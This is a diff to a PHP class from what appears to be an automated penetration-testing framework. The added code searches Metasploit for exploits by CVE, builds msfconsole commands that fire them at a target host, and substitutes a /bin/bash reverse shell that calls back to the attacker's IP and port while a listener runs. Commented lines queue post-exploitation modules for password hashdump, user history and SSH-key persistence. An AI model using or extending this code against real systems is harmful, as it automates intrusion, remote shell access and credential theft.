@@ -7,12 +7,54 @@ class SERVICE4COM extends AUTH {
         parent::__construct($eth,$domain,$ip,$port,$protocol);	
     }
     
+    
+    public function msf2exec($file_exploit,$target_ip,$target_port,$attacker_ip,$attacker_port){
+        
+        // set AutoRunScript multiconsolecommand -cl \"getsystem\",\"getuid\"
+        // set AutoRunScript multi_console_command -rc $this->dir_tmp/$kio1_service_smb->ip.$kio1_service_smb->port.post_linux.rc
+        // set AutoRunScript post/linux/gather/enum_system
+        //$query = "echo \"run post/linux/gather/enum_users_history\nrun post/linux/gather/enum_system\nrun post/linux/gather/enum_configs\nrun post/linux/gather/enum_network\nrun post/linux/gather/enum_protections\nrun post/linux/gather/hashdump\nrun post/linux/manage/sshkey_persistence\" > $this->dir_tmp/$this->ip.$this->port.post_linux.rc";
+        //$this->requette($query);
+        
+        $this->ssTitre(__FUNCTION__);
+
+        $cmd = "";
+        $file_exploit = trim($file_exploit);
+
+        if (!empty($file_exploit)){
+            $tab_payloads = $this->service8msf8exploit2payloads($file_exploit);
+            $this->article("ALL Payloads",$this->tab($tab_payloads));
+            
+            foreach ($tab_payloads as $payload){
+                $payload = trim($payload);
+                if (!empty($payload)){
+                    //$this->service8msf8exploit2payload2options($file_exploit, $payload);$this->pause();
+                    
+                    switch ($payload){
+                        case "php/exec" :
+                                $cmd = "use $file_exploit;set RHOSTS $target_ip;set RPORT $target_port;set payload php/exec;set CMD \"%CMD%\";run";
+                           break;
+                            }
+                    
+                }
+                
+            }
+            
+            
+            $query = "msfconsole -q -x '$cmd' " ;
+            $this->pause();
+            if (!empty($cmd)) return $query;
+            else return $cmd;
+        }
+    }
+    
     public function msf2search2exec($cve){
         $cve = trim($cve);
-        $result = "";
+
         $files_exploit = array();
         $this->ssTitre(__FUNCTION__);
-        $hash = sha1($cve);
+        $shell = "/bin/bash";
+
         $attacker_ip = $this->ip4addr4target($this->ip);
         
         $files_exploit = array_filter($this->msf2search($cve)) ;
@@ -23,15 +65,20 @@ class SERVICE4COM extends AUTH {
                     $file_exploit = trim($file_exploit);
                     $this->article("EXEC $file_exploit", $cve);
                     $cmd_rev = $this->msf2exec($file_exploit,$this->ip,$this->port,$attacker_ip,$lport);
-                    $templateB64_shell = base64_encode($cmd_rev);
+                    if (!empty($cmd_rev)){
+                    $templateB64_shell = base64_encode(str_replace("%CMD%", "%SHELL%", $cmd_rev));
                     
+                    $rev = $this->rev8sh($attacker_ip, $lport, $shell) ;
+                    $cmd = str_replace("%CMD%", $rev, $cmd_rev);
                     $lprotocol = 'T';
-                    $type = 'client';
-                    $this->service4lan($cmd_rev, $templateB64_shell, $lport, $lprotocol,$type);
+                    $type = 'server';
+                    $this->service4lan($cmd, $templateB64_shell, $lport, $lprotocol,$type);
+                    }
+                    
                 }
             }
         }
-        return $result ;
+
     }
 
     
@@ -111,8 +158,8 @@ class SERVICE4COM extends AUTH {
     
     
     public function service4lan($cmd_rev,$templateB64_shell,$lport,$lprotocol,$type){
-        $templateB64_cmd = base64_encode($cmd_rev);
-        $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $lport $lprotocol $templateB64_cmd $templateB64_shell $type 60 listening_Server\" ";
+        $templateB64_cmd = base64_encode(str_replace("%SHELL%", "%CMD%", base64_decode($templateB64_shell)));
+        $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $lport $lprotocol $templateB64_cmd $templateB64_shell $type 30 listening_Server\" ";
         $time = $this->stream_timeout ;       
         if ($type=="client") $this->exec_parallel($cmd_rev, $cmd1, $time);
         if ($type=="server") $this->exec_parallel($cmd1, $cmd_rev, $time);
@@ -171,7 +218,7 @@ class SERVICE4COM extends AUTH {
     public function service8msf8exploit2payloads($exploit){
         $exploit = trim($exploit);
         $rst = array();
-        $query = "msfconsole -q -y /usr/share/metasploit-framework/config/database.yml -x \"use $exploit;show payloads;exit;\" | grep '/' | awk '{print $2}'";
+        $query = "msfconsole -q  -x \"use $exploit;show payloads;exit;\" | grep '/' | awk '{print $2}'";
         if (!empty($exploit)) return $this->req_ret_tab($query);
         else return $rst;
     }
@@ -179,7 +226,7 @@ class SERVICE4COM extends AUTH {
     public function service8msf8exploit2payload2options($exploit,$payload){
         $exploit = trim($exploit);
         $payload = trim($payload);
-        $query = "msfconsole -q -y /usr/share/metasploit-framework/config/database.yml -x \"use $exploit;set payload $payload;show options;exit;\" ";
+        $query = "msfconsole -q -x \"use $exploit;set payload $payload;show options;exit;\" ";
         if ( (!empty($exploit)) && (!empty($payload)) ) return $this->req_ret_str($query);
         else return "";
     }
